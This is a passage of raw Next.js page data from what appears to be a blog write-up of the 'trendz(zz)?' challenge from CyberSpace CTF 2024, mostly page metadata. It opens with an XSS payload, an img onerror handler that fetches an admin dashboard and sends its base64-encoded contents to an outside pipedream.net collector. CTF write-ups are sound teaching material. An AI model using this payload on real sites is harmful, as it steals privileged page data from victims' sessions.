flag:\"]}]\n24:[\"$\",\"$L10\",\"pre-7\",{\"className\":\"my-2\",\"children\":\"\u003cimg src=x onerror='fetch(`/admin/dashboard`).then(x=\u003ex.text()).then(x=\u003efetch(`https://enhs7ezpdsxpw.x.pipedream.net/` + btoa(x)))'\u003e\",\"language\":\"html\"}]\n"])</script><script>self.__next_f.push([1,"9:{\"metadata\":[[\"$\",\"title\",\"0\",{\"children\":\"CyberSpace CTF 2024 — trendz(zz)? | kevin.fish\"}],[\"$\",\"meta\",\"1\",{\"name\":\"description\",\"content\":\"The latest trendz is all about Go and HTMX, but what could possibly go wrong? A secret post has been hidden deep within the application. Your mission is to uncover it.\"}],[\"$\",\"meta\",\"2\",{\"property\":\"og:title\",\"content\":\"CyberSpace CTF 2024 — trendz(zz)?\"}],[\"$\",\"meta\",\"3\",{\"property\":\"og:description\",\"content\":\"The latest trendz is all about Go and HTMX, but what could possibly go wrong? A secret post has been hidden deep within the application. Your mission is to uncover it.\"}],[\"$\",\"meta\",\"4\",{\"name\":\"twitter:card\",\"content\":\"summary\"}],[\"$\",\"meta\",\"5\",{\"name\":\"twitter:title\",\"content\":\"CyberSpace CTF 2024 — trendz(zz)?\"}],[\"$\",\"meta\",\"6\",{\"name\":\"twitter:description\",\"content\":\"The latest trendz is all about Go and HTMX, but what could possibly go wrong? A secret post has been hidden deep within the application. Your mission is to uncover it.\"}]],\"error\":null,\"digest\":\"$undefined\"}\n"])</script><script>self.__next_f.push([1,"e:\"$9:metadata\"\n"])</script></body></html>